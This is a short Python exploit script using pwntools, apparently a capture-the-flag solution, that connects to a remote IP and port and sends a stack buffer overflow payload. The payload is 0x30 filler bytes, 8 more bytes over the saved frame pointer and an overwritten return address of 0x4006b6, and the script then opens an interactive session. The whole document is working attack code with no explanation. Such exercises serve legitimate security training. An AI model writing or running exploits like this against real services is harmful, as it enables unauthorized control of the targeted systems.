from pwn import *

r = remote("140.110.112.31",2118)
r.sendafter("skill :)","a"*0x30+"x"*8+p64(0x4006b6))
r.interactive()